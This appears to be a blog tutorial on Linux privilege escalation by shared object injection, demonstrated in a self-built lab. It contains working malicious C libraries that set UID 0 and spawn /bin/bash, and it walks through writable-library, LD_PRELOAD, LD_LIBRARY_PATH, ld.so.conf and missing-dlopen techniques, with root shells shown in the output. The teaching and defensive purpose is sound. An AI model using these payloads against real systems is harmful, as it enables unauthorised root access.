---
title: Linux Privilege Escalation - Shared Object Injection
draft: false
author: "wixnic"
authorLink: ""
description: "This is my description."
license: ""
images: []
date: 2021-10-22 11:33:00 +0800
categories: [Linux Privilege Escalation]
tags: [youtube, privilege escalation, shared object injection]
featuredImage: "/images/thumbnails/Linux-Thumbnail-Privilege-Escalation-Shared-Object-Injection.png"
featuredImagePreview: "/images/thumbnails/Linux-Thumbnail-Privilege-Escalation-Shared-Object-Injection.png"

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

resources:
- name: "Linux-Thumbnail-Privilege-Escalation-Shared-Object-Injection"
  src: ""

code:
  copy: true
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...
---

# Video

<iframe width="560" height="315" src="https://www.youtube.com/embed/gehiQNDQVqg" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>

# Setting Up

Install the required packages for this video:

```bash
low@ubuntu:~$ sudo apt update && sudo apt install -y vim gcc
```

Now `clear` the screen:

```bash
low@ubuntu:~$ clear
```

Let's start by creating a working directory:

```bash
low@ubuntu:~$ mkdir so-files
low@ubuntu:~$ cd !$
cd so-files
low@ubuntu:~/so-files$ 
```

We'll create a file named `libcustom.c`:

```bash
low@ubuntu:~/so-files$ vim libcustom.c
```

This print a message and nothing more:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void say_hi(){
    printf("Message from libcustom.c\n");
}
```

Then we'll create a header file named `libcustom.h`, which is the header file:

```bash
low@ubuntu:~/so-files$ vim libcustom.h
```

This code basically calls an external function, in this case the function called `say_hi`:

```c
#ifndef say_hi_h__
#define say_hi_h__

extern void say_hi(void);

#endif  // say_hi_h__
```

Now we will write create a program that simply prints a message. I will name this file as `myexec.c`:

```bash
low@ubuntu:~/so-files$ vim myexec.c
```

This code imports the `libcustom.h` header file, the `main()` function prints a message and it executes the `say_hi()` function which is found in the header file `libcustom.h` and if the execution is successful it returns a status code of (0):

```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Message from myexec.c!\n");
    say_hi();
    return 0;
}
```

Now create a new directory named `evil` and navigate there, this is where the malicious library will be placed:

```bash
low@ubuntu:~/so-files$ mkdir evil
low@ubuntu:~/so-files$ cd !$
cd evil
low@ubuntu:~/so-files/evil$ 
```

Lastly, we'll create the code that will be included in the malicious library file. I'll named this file as `libcustom.c`:

```bash
low@ubuntu:~/so-files/evil$ vim libcustom.c
```

This code sets the UID (0) which is the UID of the root user. Then it sets the GID of (0) which the root group. The next three lines print a message of their own. The last line spawns a bash shell:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void say_hi(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library!\n");
    printf("I'm trying to spawn a root shell...\n");
    printf("Check your shell!\n");
    system("/bin/bash");
}
```

Now copy the original header file to our current working directory:

```bash
low@ubuntu:~/so-files/evil$ cp ../libcustom.h .
low@ubuntu:~/so-files/evil$ ls
libcustom.c  libcustom.h
```

Let's create the malicious shared object:

```bash
low@ubuntu:~/so-files/evil$ gcc -c -Wall -Werror -fPIC libcustom.c
low@ubuntu:~/so-files/evil$ gcc -shared -o libcustom.so libcustom.o
low@ubuntu:~/so-files/evil$ ls -l
total 28
-rw-rw-r-- 1 low low   281 Dec 10 12:13 libcustom.c
-rw-rw-r-- 1 low low    88 Dec 10 12:14 libcustom.h
-rw-rw-r-- 1 low low  2104 Dec 10 12:14 libcustom.o
-rwxrwxr-x 1 low low 16360 Dec 10 12:14 libcustom.so
```

Now go back to the main directory:

```bash
low@ubuntu:~/so-files/evil$ cd ~/so-files
```

This creates an object file:

```bash
low@ubuntu:~/so-files$ gcc -c -Wall -Werror -fPIC libcustom.c
```

Then create a shared object file:

```bash
low@ubuntu:~/so-files$ gcc -shared -o libcustom.so libcustom.o
```

Copy the shared object to the library directory:

```bash
low@ubuntu:~/so-files$ sudo cp libcustom.so /usr/lib/
```

Finally, compile the program:

```bash
low@ubuntu:~/so-files$ gcc -Wall -o myexec myexec.c -lcustom
```

Then we can confirm how this is loading the library with ldd:

```bash
low@ubuntu:~/so-files$ ldd ./myexec
	linux-vdso.so.1 (0x00007ffcb9571000)
	libcustom.so => /lib/libcustom.so (0x00007f74a1d09000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f74a1b17000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f74a1d24000)
```

Looking at this directories we can see a symbolic link from /lib to usr/lib:

```bash
low@ubuntu:~/so-files$ ls -la /lib
lrwxrwxrwx 1 root root 7 Nov 25 07:43 /lib -> usr/lib
low@ubuntu:~/so-files$ ls -la /lib/libcustom.so
-rwxr-xr-x 1 root root 16200 Dec 10 12:15 /lib/libcustom.so
low@ubuntu:~/so-files$ ls -la /usr/lib/libcustom.so
-rwxr-xr-x 1 root root 16200 Dec 10 12:15 /usr/lib/libcustom.so
```

We can also confirm the magic bytes with the program file:

```bash
low@ubuntu:~/so-files$ file libcustom.c
libcustom.c: C source, ASCII text
low@ubuntu:~/so-files$ file libcustom.h
libcustom.h: C source, ASCII text
low@ubuntu:~/so-files$ file libcustom.o
libcustom.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped
low@ubuntu:~/so-files$ file libcustom.so
libcustom.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=0a68a5d5e67fd1490da8bd5a4ea15443708aa8eb, not stripped
low@ubuntu:~/so-files$ file myexec.c
myexec.c: C source, ASCII text
low@ubuntu:~/so-files$ file myexec
myexec: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4200d2a9c3ccff108f83ff6e875db38a37c3ea5c, for GNU/Linux 3.2.0, not stripped
```

We can read ELF files with the `readelf` command (`-d` stands for dynamic):

```bash
low@ubuntu:~/so-files$ readelf -d myexec

Dynamic section at offset 0x2db0 contains 28 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 <...SNIP...>
```

Let's create an SUID bit to the binary:

```bash
low@ubuntu:~/so-files$ sudo cp myexec /usr/bin/myexec
low@ubuntu:~/so-files$ sudo chmod u+s /usr/bin/myexec 
```

We can use the find command to search for SUID files:

```bash
low@ubuntu:~/so-files$ find / -type f -perm -u=s 2>/dev/null | xargs ls -l | grep myexec
-rwsr-xr-x 1 root root             16728 Dec 10 12:20 /usr/bin/myexec
```

Additionally, we are gonna create another one but **WITHOUT** an SUID bit set:

```bash
low@ubuntu:~/so-files$ sudo cp ~/so-files/myexec /usr/bin/myexec2
```

Try to execute the `/usr/bin/myexec` binary:

```bash
low@ubuntu:~/so-files/evil$ /usr/bin/myexec
Message from myexec.c!
Message from libcustom.c
```

As we can see above, the library gets loaded and executed.

# Privilege Escalation

## Method #1: Write permissions in /lib -> /usr/lib

Let's navigate to where the malicious library is located:

```bash
low@ubuntu:~/so-files$ cd ~/so-files/evil
low@ubuntu:~/so-files/evil$ 
```

Startup by adding write permissions to the folder `/usr/lib`, this is a misconfiguration that should never be done:

```bash
low@ubuntu:~/so-files/evil$ sudo chmod o+w /usr/lib/libcustom.so
```

Replace the original library file with the malicious library file:

```bash
low@ubuntu:~/so-files/evil$ cp libcustom.so /lib/libcustom.so
```

Using `ldd` we can see that the library `libcustom.so` is pointing to the file that we just replaced:

```bash
low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec
	linux-vdso.so.1 (0x00007fff77137000)
	libcustom.so => /lib/libcustom.so (0x00007fdca1371000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdca117f000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fdca138c000)
```

If we execute the binary, it will load the malicious library:

```bash
low@ubuntu:~/so-files/evil$ /usr/bin/myexec
Message from myexec.c!
I'm the bad library!
I'm trying to spawn a root shell...
Check your shell!
root@ubuntu:~/so-files/evil# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000(low)
root@ubuntu:~/so-files/evil# whoami
root
root@ubuntu:~/so-files/evil# 
```

As we can see, we're able to escalate privileges.

Exit out of the root shell:

```bash
root@ubuntu:~/so-files/evil# exit
```

Now let's restore the original library:

```bash
low@ubuntu:~/so-files/evil$ sudo cp ~/so-files/libcustom.so /lib/libcustom.so 
```

Lastly, remove the write permissions from other users and groups:

```bash
low@ubuntu:~/so-files/evil$ sudo chmod o-w /lib/libcustom.so
```

## Method #2: LD_PRELOAD (PATCHED)

This will **ONLY** work if the binary does **NOT** have an SUID bit set. Let's execute the binary that does **NOT** have an SUID bit set, in this case `myexec2` that we created earlier: 

```bash
low@ubuntu:~/so-files/evil$ LD_PRELOAD=/home/low/so-files/evil/libcustom.so /usr/bin/myexec2
Message from myexec.c!
I'm the bad library!
I'm trying to spawn a root shell...
Check your shell!
low@ubuntu:~/so-files/evil$ 
```

As we can see above, it loads the malicious library but it then notices that there's an SUID bit declaration in the malicious library and therefore it doesn't execute root shell. Now let's try the executing a binary with the SUID bit set:

```bash
low@ubuntu:~/so-files/evil$ LD_PRELOAD=/home/low/so-files/evil/libcustom.so /usr/bin/myexec
Message from myexec.c!
Message from libcustom.c
low@ubuntu:~/so-files/evil$ 
```

It doesn't even load the malicious library because the binary itself (myexec) has an SUID bit set. This doesn't work because it has been patched.

Now let's remove the value in the LD_PRELOAD environment variable with the `unset` command:

```bash
low@ubuntu:~/so-files/evil$ echo $LD_PRELOAD
/home/low/so-files/evil/libcustom.so
low@ubuntu:~/so-files/evil$ unset LD_PRELOAD
low@ubuntu:~/so-files/evil$ echo $LD_PRELOAD

low@ubuntu:~/so-files/evil$ 
```


## Method #3: LD_LIBRARY_PATH (PATCHED)

Let's modify the value of the LD_LIBRARY_PATH environment variable by adding the directory in which the malicious library is located:

```bash
low@ubuntu:~/so-files/evil$ export LD_LIBRARY_PATH=/home/low/so-files/evil/
low@ubuntu:~/so-files/evil$ echo $LD_LIBRARY_PATH
/home/low/so-files/evil/
low@ubuntu:~/so-files/evil$ 
```

Using `ldd` we can see that library `libcustom.so` is now pointing to the directory that has the malicious library:

```bash
low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec
	linux-vdso.so.1 (0x00007ffffe3f3000)
	libcustom.so => /home/low/so-files/evil/libcustom.so (0x00007fe052992000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe052791000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fe05299e000)
low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec2
	linux-vdso.so.1 (0x00007ffde8bb2000)
	libcustom.so => /home/low/so-files/evil/libcustom.so (0x00007f7c0f2b0000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7c0f0af000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f7c0f2bc000)
low@ubuntu:~/so-files/evil$ 
```

If we try to do the same things as we did with the environment variable `LD_PRELOAD`, we can see that the same thing happens:

```bash
low@ubuntu:~/so-files/evil$ /usr/bin/myexec
Message from myexec.c!
Message from libcustom.c

low@ubuntu:~/so-files/evil$ /usr/bin/myexec2
Message from myexec.c!
I'm the bad library!
I'm trying to spawn a root shell...
Check your shell!
low@ubuntu:~/so-files/evil$ 
```

This doesn't work because it has been patched as well.

Now let's remove the value in the LD_LIBRARY_PATH environment variable with the `unset` command:

```bash
low@ubuntu:~/so-files/evil$ echo $LD_LIBRARY_PATH
/home/low/so-files/evil/
low@ubuntu:~/so-files/evil$ unset LD_LIBRARY_PATH
low@ubuntu:~/so-files/evil$ echo $LD_LIBRARY_PATH

low@ubuntu:~/so-files/evil$ 
```

## Method #4: /etc/ldconfig.so.conf

Before continuing make sure that the environments variables that we used before are cleared:

```bash
low@ubuntu:~/so-files/evil$ echo $LD_LIBRARY_PATH

low@ubuntu:~/so-files/evil$ echo $LD_PRELOAD

low@ubuntu:~/so-files/evil$ 
```

The file `/etc/ld.so.conf` is a configuration file pointing to other configuration files that will help the linker to locate libraries. Read the directories listed in the ldconfig configuration file `/etc/ld.so.conf`:

```bash
low@ubuntu:~/so-files/evil$ ls -la  /etc/ld.so.conf
-rw-r--r-- 1 root root 34 Apr 14  2020 /etc/ld.so.conf
low@ubuntu:~/so-files/evil$ cat /etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

low@ubuntu:~/so-files/evil$ 
```

If we list the configuration files that are located in `/etc/ld.so.conf.d/` we can see a few:

```bash
low@ubuntu:~/so-files/evil$ ls -la /etc/ld.so.conf.d/
total 24
drwxr-xr-x   2 root root  4096 Aug 19 06:30 .
drwxr-xr-x 128 root root 12288 Dec 10 12:04 ..
-rw-r--r--   1 root root    44 Apr 14  2020 libc.conf
-rw-r--r--   1 root root   100 Apr 14  2020 x86_64-linux-gnu.conf
```

Create custom configuration file which points to the `/tmp` directory, which is a directory that low privileged users have write permissions on:

```bash
low@ubuntu:~/so-files/evil$ sudo vim /etc/ld.so.conf.d/shouldnt_be_here.conf
low@ubuntu:~/so-files/evil$ cat /etc/ld.so.conf.d/shouldnt_be_here.conf
/tmp
```

Since we have write permissions in the `/tmp` directory, we can place or write our malicious shared object there:

```bash
low@ubuntu:~/so-files/evil$ cp libcustom.so /tmp
low@ubuntu:~/so-files/evil$ ls -l /tmp/libcustom.so
-rwxrwxr-x 1 low low 16360 Dec 10 12:38 /tmp/libcustom.so
low@ubuntu:~/so-files/evil$ 
```

We now need to use **ldconfig** to update the linker’s cache so that it will be aware of this new evil library. The cache can be updated with the `ldconfig` command.

`ldd` output **BEFORE** executing `ldconfig`:

```bash
low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec
	linux-vdso.so.1 (0x00007ffc00ff9000)
	libcustom.so => /lib/libcustom.so (0x00007f7b7e24d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7b7e05b000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f7b7e268000)
low@ubuntu:~/so-files/evil$ 
```

`ldd` output **AFTER** executing `ldconfig`:

```bash
low@ubuntu:~/so-files/evil$ sudo /usr/sbin/ldconfig
low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec
	linux-vdso.so.1 (0x00007fff9b6cd000)
	libcustom.so => /tmp/libcustom.so (0x00007f63a510f000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f63a4f1d000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f63a512a000)
low@ubuntu:~/so-files/evil$
```

Now we execute the binary:

```bash
low@ubuntu:~/so-files/evil$ /usr/bin/myexec
Message from myexec.c!
I'm the bad library!
I'm trying to spawn a root shell...
Check your shell!
root@ubuntu:~/so-files/evil# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000(low)
root@ubuntu:~/so-files/evil# whoami
root
root@ubuntu:~/so-files/evil# 
```

We can see that we have escalated privileges.

Exit out of the root shell:

```bash
root@ubuntu:~/so-files/evil# exit
```

Now remove the configuration file:

```bash
low@ubuntu:~/so-files/evil$ sudo rm /etc/ld.so.conf.d/shouldnt_be_here.conf
```

Now reload the `ld` configuration with `ldconfig`:

```bash
low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec
	linux-vdso.so.1 (0x00007ffd4cd08000)
	libcustom.so => /tmp/libcustom.so (0x00007f150e0a7000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f150deb5000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f150e0c2000)
low@ubuntu:~/so-files/evil$ sudo ldconfig
low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec
	linux-vdso.so.1 (0x00007ffeaefb4000)
	libcustom.so => /lib/libcustom.so (0x00007f35cf80a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f35cf618000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f35cf825000)
low@ubuntu:~/so-files/evil$ 
```

### Alternative ld.so.conf

We create our fake **ld.so.conf**:

```bash
low@ubuntu:~/so-files/evil$ cd /tmp
low@ubuntu:/tmp$ echo "include /tmp/conf/*" > /tmp/fake.ld.so.conf
```

Then, we add a configuration file to the location indicated by **fake.ld.so.conf**:

```bash
low@ubuntu:/tmp$ mkdir conf
low@ubuntu:/tmp$ echo "/tmp" > conf/evil.conf
```

Finally, we execute `ldconfig` with the -f option:

```bash
low@ubuntu:/tmp$ sudo ldconfig -f fake.ld.so.conf
```

Now verify that the shared object that is being loaded is the malicious one and execute the binary (myexec):

```bash
low@ubuntu:/tmp$ ldd /usr/bin/myexec
	linux-vdso.so.1 (0x00007ffd872a4000)
	libcustom.so => /tmp/libcustom.so (0x00007f9a11ce3000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a11af1000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f9a11cfe000)

low@ubuntu:/tmp$ /usr/bin/myexec
Message from myexec.c!
I'm the bad library!
I'm trying to spawn a root shell...
Check your shell!
root@ubuntu:/tmp# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000(low)
root@ubuntu:/tmp# whoami
root
root@ubuntu:/tmp# 
```

We are able to escalate privileges, let's exit out of the root shell:

```bash
root@ubuntu:/tmp# exit
```

Now remove everything:

```bash
low@ubuntu:/tmp$ rm libcustom.so 
low@ubuntu:/tmp$ rm fake.ld.so.conf 
low@ubuntu:/tmp$ sudo rm -rf conf
```

Review that the shared object is loading the correct one:

```bash
low@ubuntu:/tmp$ ldd /usr/bin/myexec
	linux-vdso.so.1 (0x00007ffd07df0000)
	libcustom.so => /lib/libcustom.so (0x00007fdf67edb000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdf67ce9000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fdf67ef6000)
```

## Method #5: Missing Shared Object

Let's navigate to the directory where our `.so` files are located:

```bash
low@ubuntu:/tmp$ cd ~/so-files
```

Create a file named `nosuchfile.c` which it will open a shared object file: 

```bash
low@ubuntu:~/so-files$ vim nosuchfile.c
```

Add the following code which basically prints the 'Hello' string on the screen and opens a dynamic library, in this case a shared object file named `custom.so`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

int main(){
    printf("Hello\n");
    dlopen("/home/low/.config/custom.so",1); // Load the custom.so shared object.
    return 0;
}
```

To compile you have to link against libdl, in order to do this add the `-ldl` option:

```bash
low@ubuntu:~/so-files$ gcc -o nosuchfile nosuchfile.c -ldl
```

Now copy this file to the `/usr/bin/` directory:

```bash
low@ubuntu:~/so-files$ sudo cp nosuchfile /usr/bin/
```

Then add the SUID bit to the `/usr/bin/nosuchfile` binary:

```
low@ubuntu:~/.config$ sudo chmod u+s /usr/bin/nosuchfile 
```

Check if the file is not found:

```bash
low@ubuntu:~/so-files$ strace /usr/bin/nosuchfile 2>&1 | grep -iE "open|access|no such file"
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libdl.so.2", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/home/low/.config/custom.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

Create a custom shared object in the directory that the binary (nosuchfile) looks for the dynamic library, in this case is `/home/low/.config/custom.so`. 

```bash
vim /home/low/.config/custom.c
```

Will create a code that executes bash as root:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject()
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

Navigate to the directory `/home/low/.config`:

```bash
low@ubuntu:~/so-files$ cd /home/low/.config
```

Now compile the `custom.c` file and ignore the warning message:

Treat warnings as errors (-Werror), as a developer you should always try to use this:

```bash
low@ubuntu:~/.config$ gcc -c -Wall -Werror -fpic custom.c
custom.c: In function ‘inject’:
custom.c:7:2: error: implicit declaration of function ‘setuid’ [-Werror=implicit-function-declaration]
    7 |  setuid(0);
      |  ^~~~~~
custom.c:8:2: error: implicit declaration of function ‘setgid’ [-Werror=implicit-function-declaration]
    8 |  setgid(0);
      |  ^~~~~~
cc1: all warnings being treated as errors
```

However, because I want to demonstrate this privilege escalation technique, I'll ignore the warnings and just compile the program so I won't use it:

```bash
low@ubuntu:~/.config$ gcc -c -Wall -fpic custom.c
custom.c: In function ‘inject’:
custom.c:7:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 |  setuid(0);
      |  ^~~~~~
custom.c:8:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    8 |  setgid(0);
      |  ^~~~~~
```

Create the shared object:

```bash
low@ubuntu:~/.config$ gcc -shared -o custom.so custom.o
```

Execute the program and since program has a SUID bit set, it executes as root, then it loads the evil library, and the evil library spawns a root shell:

```bash
/usr/bin/nosuchfile
```

As you can see we're able to escalate to the root user:

```bash
low@ubuntu:~/.config$ /usr/bin/nosuchfile
Hello
root@ubuntu:~/.config# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000(low)
```

Now remove the SUID bit and try to execute the binary again:

```bash
low@ubuntu:~/.config$ sudo chmod u-s /usr/bin/nosuchfile 
low@ubuntu:~/.config$ /usr/bin/nosuchfile
Hello
low@ubuntu:~/.config$ 
```

For this to work, the binary must have the SUID bit set.
